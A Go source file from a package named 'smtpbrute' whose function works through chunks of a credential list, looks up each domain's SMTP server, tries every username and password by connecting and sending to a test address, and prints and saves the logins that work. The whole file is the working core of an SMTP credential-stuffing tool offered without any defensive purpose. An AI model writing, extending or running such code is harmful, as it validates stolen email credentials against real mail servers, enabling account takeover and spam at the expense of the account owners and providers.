package smtpbrute

import (
	"fmt"
	"sync"

	"github.com/fatih/color"
)

func ProcessCredentials(wordList <-chan []string, testEmail string, storeCreds *[]string, mutex *sync.Mutex, wg *sync.WaitGroup) {
	defer wg.Done()
	wordListChunks := <-wordList
	for _, creds := range wordListChunks {
		splitedCreds, err := FilterGmailCreds(creds)
		if err != nil && splitedCreds != nil {
			results, err := ConnectSMTP(splitedCreds, testEmail)
			if err == nil {
				green := color.New(color.FgGreen).PrintfFunc()
				host, port, username, password := results[2], results[3], results[0], results[1]
				green("%s\t%s\t%s\t%s\n", host, port, username, password)
				mutex.Lock()
				finalCreds := fmt.Sprintf("%s:%s => %s:%s\n", host, port, username, password)
				*storeCreds = append(*storeCreds, finalCreds)
				mutex.Unlock()
			}

		} else if err == nil {
			smtpCreds, err := LookupDomain(splitedCreds)
			if err == nil {
				results, err := ConnectSMTP(smtpCreds, testEmail)
				if err == nil {
					green := color.New(color.FgGreen).PrintfFunc()
					host, port, username, password := results[2], results[3], results[0], results[1]
					green("%s\t%s\t%s\t%s\n", host, port, username, password)
					mutex.Lock()
					finalCreds := fmt.Sprintf("%s:%s => %s:%s\n", host, port, username, password)
					*storeCreds = append(*storeCreds, finalCreds)
					mutex.Unlock()
				}
			}
		}
	}
}
